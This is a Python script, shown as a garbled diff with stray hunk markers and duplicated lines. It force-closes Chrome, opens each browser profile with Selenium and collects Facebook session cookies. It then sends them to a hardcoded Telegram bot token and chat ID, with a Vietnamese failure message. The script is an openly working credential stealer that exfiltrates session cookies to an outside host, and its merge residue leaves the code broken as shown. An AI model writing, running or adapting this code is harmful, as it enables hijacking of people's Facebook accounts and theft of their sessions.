import os
 import sys
 import subprocess
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 import requests
 
 TOKEN = '7533821284:AAGDsLUDpZYbfzdghq8QihpeHXfhzGIP43I'
 CHAT_ID = '1174455752'
 TELEGRAM_API = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'
 
 def install_libraries():
     required_libs = ["requests", "webdriver_manager", "selenium"]
     try:
         print("Ensuring pip is installed...")
         subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print("Upgrading pip...")
         subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         for lib in required_libs:
             if subprocess.run([sys.executable, "-c", "import " + lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
                 print(f"Installing {lib}...")
                 subprocess.run([sys.executable, "-m", "pip", "install", lib], check=True)
     except subprocess.CalledProcessError:
     except subprocess.CalledProcessError as e:
         print(f"Error installing libraries: {e}")
         sys.exit(1)
 
 def close_chrome():
     print("Closing Chrome processes...")
     subprocess.run("taskkill /F /IM chrome.exe", shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def check_chrome_installed():
 @@ -35,6 +40,7 @@
         os.path.join(os.getenv("LOCALAPPDATA", "C:\\Users\\" + os.getenv("USERNAME")), "Google", "Chrome", "Application", "chrome.exe"),
     ]
     if not any(os.path.exists(path) for path in possible_paths):
         print("Error: Chrome is not installed.")
         sys.exit(1)
     return True
 
 @@ -49,13 +55,15 @@
     options.add_argument("profile-directory=" + profile_name)
 
     try:
         print(f"Getting cookies from profile {profile_name}...")
         driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
         driver.get('https://www.facebook.com/')
         WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
         cookies = [c for c in driver.get_cookies() if 'facebook.com' in c['domain']]
         driver.quit()
         return cookies
     except Exception:
     except Exception as e:
         print(f"Error with profile {profile_name}: {e}")
         return None
 
 def cookies_to_header_string(cookies):
 @@ -64,13 +72,17 @@
 def send_telegram(profile_cookies):
     message = "\n\n".join(f"Profile: {p}\n{cookies_to_header_string(c)}" for p, c in profile_cookies.items()) or "Không lấy được cookies!"
     try:
         print("Sending cookies to Telegram...")
         response = requests.post(TELEGRAM_API, data={'chat_id': CHAT_ID, 'text': message}, timeout=5)
         if response.status_code != 200:
             pass
     except Exception:
         pass
             print(f"Error sending Telegram message: {response.text}")
         else:
             print("Cookies sent to Telegram successfully.")
     except Exception as e:
         print(f"Error sending Telegram message: {e}")
 
 if __name__ == "__main__":
     print("Starting script...")
     install_libraries()
     if not check_chrome_installed():
         sys.exit(1)
 @@ -86,3 +98,5 @@
             profile_cookies[profile] = cookies
 
     send_telegram(profile_cookies)
     print("Script completed. Press any key to exit...")
     input()
